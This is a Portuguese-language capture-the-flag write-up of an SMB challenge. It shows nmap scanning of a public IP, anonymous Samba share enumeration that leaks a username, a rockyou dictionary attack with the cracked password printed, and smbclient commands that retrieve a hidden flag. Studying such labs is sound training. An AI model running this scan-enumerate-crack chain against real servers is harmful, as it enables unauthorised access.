# 🔌 Protocolo Vulnerável

**Categoria:** CTF — Offensive Security / SMB / Credential Cracking · **Pontuação:** 100 pts
**Alvo:** `http://45.55.126.134/`
**Flag:** `FIAP{SMB_ON_2024}`

## Enunciado

> Você foi desafiado a identificar e explorar uma vulnerabilidade em um protocolo de rede específico. Sua missão é descobrir qual protocolo está sendo utilizado na máquina-alvo e encontrar uma vulnerabilidade conhecida associada a esse protocolo. Ao explorar essa vulnerabilidade, você terá a oportunidade de obter acesso à máquina e recuperar a flag.

## Metodologia

### 1. Reconhecimento geral

```bash
nmap -sS -A 45.55.126.134 -Pn -T4
```

```text
PORT     STATE    SERVICE  VERSION
21/tcp   open     tcpwrapped
22/tcp   open     ssh      OpenSSH 9.2p1 Debian
80/tcp   open     http     Apache httpd 2.4.62 ((Debian))
139/tcp  filtered netbios-ssn
445/tcp  filtered microsoft-ds
```

> ⚠️ **Observação importante:** as portas SMB (139/445) aparecem como `filtered` no `nmap` (sem resposta ao SYN scan), o que inicialmente sugere bloqueio total por firewall. **Na prática, o serviço estava acessível** via conexão TCP completa (`smbclient`) — "filtered" aqui refletiu apenas a ausência de resposta ao scan, não um bloqueio real de aplicação. É um lembrete de que o resultado do `nmap` deve ser validado com uma tentativa de conexão de aplicação antes de descartar um serviço como inacessível.

### 2. Caminho de investigação descartado — FTP (ProFTPD)

Como a porta 21 estava aberta, cogitou-se inicialmente o `mod_copy` do ProFTPD (CVE-2015-3306), que permite copiar arquivos arbitrários via `SITE CPFR`/`SITE CPTO` dentro de uma sessão autenticada. O serviço, porém, encontrava-se indisponível para esse vetor especificamente — o protocolo correto do desafio era outro: **SMB**.

### 3. Fingerprint do serviço SMB

```bash
nmap -Pn -p139,445 --script smb-os-discovery,smb-protocols,smb2-security-mode 45.55.126.134
```

- **Serviço:** Samba 4.17.12-Debian
- **Dialetos suportados:** SMB 2.0.2 a 3.1.1 — **SMBv1 desativado**, portanto imune ao EternalBlue (MS17-010).

### 4. Enumeração de compartilhamentos via sessão nula (anônima)

```bash
smbclient -L //45.55.126.134/ -N -m SMB3
```

```text
Sharename  Type  Comment
---------  ----  -------
print$     Disk  Printer Drivers
opteron    Disk                            ← usuário vazado via nome do share
IPC$       IPC   IPC Service (Samba 4.17.12-Debian)
nobody     Disk  Home Directories
```

A própria enumeração anônima já vaza um nome de usuário plausível: **`opteron`** (nome do share).

### 5. Quebra de credencial (dicionário RockYou)

Com o usuário `opteron` em mãos, realizado ataque de dicionário com `rockyou.txt`, resultando na credencial:

```
opteron:sayang
```

### 6. Acesso ao compartilhamento e captura da flag

```bash
# Listar (incluindo ocultos)
smbclient //45.55.126.134/opteron -U opteron%sayang -m SMB3 -c "ls"
```

```text
.flag    H    18 bytes   (arquivo oculto)
```

```bash
# Baixar e exibir
smbclient //45.55.126.134/opteron -U opteron%sayang -m SMB3 -c "get .flag"
cat .flag
```

## Flag

```
FIAP{SMB_ON_2024}
```

## Vulnerabilidade identificada

**Categoria:** Enumeração anônima de compartilhamentos SMB (sessão nula) + credenciais fracas sujeitas a ataque de dicionário.

## Lição aprendida

- Mesmo com SMBv1 desativado (sem EternalBlue), a sessão nula (`-N`) ainda permite listar shares e, por vezes, vazar nomes de usuário válidos — um erro clássico de configuração do Samba.
- Senhas fracas o suficiente para constarem em wordlists públicas (RockYou) continuam sendo o vetor de comprometimento mais comum, independente da robustez do protocolo em si.
- Resultado de scanner (`filtered` no nmap) não é definitivo — vale sempre confirmar com uma tentativa de conexão real da aplicação antes de descartar um serviço.
